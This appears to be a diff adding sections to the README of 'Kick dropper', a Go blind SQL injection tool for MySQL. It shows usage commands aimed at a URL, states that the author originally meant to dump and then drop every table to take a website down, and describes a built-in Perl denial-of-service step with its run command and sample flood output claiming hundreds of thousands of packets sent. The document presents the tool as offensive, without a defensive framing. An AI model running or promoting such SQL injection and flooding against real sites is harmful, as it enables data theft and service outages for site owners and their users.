@@ -27,6 +27,24 @@ Powered by GoLang
 
 Kick dropper is a very simple and leightweight demonstration of SQL querying, and injection by parsing URl's, inspired by SQLmap with data output but not as fast, you might be asking why kick dropper, well the original plan was to download all of the database information, then drop every single table in every database it had and then thus terminating the website, however i could not find a way to properly do this and extracting the info just was not working, so i added something extra at the end 
 
+# how it works 
+```
+this is a very very simple blind SQL Injection script for MySQL servers ONLY
+
+as the pre set query commanda are well exactly MySQL servers or will only execute for those servers 
+
+this script connects and parses the DB, injects the URL and parses through a list or array of characters 
+
+to match up to the name of the database or table ex
+
++----------------+
+|           Name |
++================+
+|    TBL_whatever |
++----------------+
+
+```
+
 # general usage and syntax 
 ```
 go run main.go --url "<url>" | ex go run main.go --url "http://testphp.vulnweb.com/index.php?id=1"
@@ -98,9 +116,59 @@ example output
 +-------------+
 ```
 
+# main and finale function aka Kick the ass of the server 
+
+powered with perl this is a simple DOS to knock or DROP kick the server offline for a bit, this is optional, after all is done when it comes to SQL injecting you will get something like the following output
+
+```
+
+[22:4:42]  [DATA] TO OWN/RETRIEVE      => finished gathering at =>  2022-01-09 22:25:29.959780903 -0500 EST m=+1247.694968902
+[22:4:42]  [WARNING] [ WARNING ATTACK INITATION ] DROPPING SERVER IN 10 SECONDS
+domain name .com 
+[22:4:42]  [WARNING] [ WARNING ATTACK INITATION ] DROPPING SERVER.............
+domain IP => domain ip address
+
+
+ please now enter this command in your terminal 
++--------------------------------------------+
+|                COMMAND TO KICK DROP SERVER |
++============================================+
+|    sudo perl get.pl 1.1.1.1 domainip       |
++--------------------------------------------+
+
+```
+
+this command you will then run as the ip address you were given the following output will occur  < Example > 
+
+```
+[ DATA ] SENT => 78529 packets to => 127.0.0.1
+[ DATA ] SENT => 78530 packets to => 127.0.0.1
+[ DATA ] SENT => 78531 packets to => 127.0.0.1
+[ DATA ] SENT => 78532 packets to => 127.0.0.1
+[ DATA ] SENT => 78533 packets to => 127.0.0.1
+[ DATA ] SENT => 78534 packets to => 127.0.0.1
+[ DATA ] SENT => 78535 packets to => 127.0.0.1
+[ DATA ] SENT => 78536 packets to => 127.0.0.1
+[ DATA ] SENT => 78537 packets to => 127.0.0.1
+[ DATA ] SENT => 78538 packets to => 127.0.0.1
+[ DATA ] SENT => 78539 packets to => 127.0.0.1
+[ DATA ] SENT => 78540 packets to => 127.0.0.1
+```
+
+in a few good seconds you should have sent anywhere between 95,000 to 400,000 packets to the server probobly crashing it for a second, its a in built feature you just gotta say `why not`
+
 # servers supported 
 
 ```
 MySQL Newest and oldest tested on both
 ```
- 
+
+# installs
+
+```
+git clone https://github.com/ArkAngeL43/Kick-Dr00per.git ; cd Kick-Dr00per ; chmod +x ./install.sh ; ./install.sh 
+```
+
+
+
+
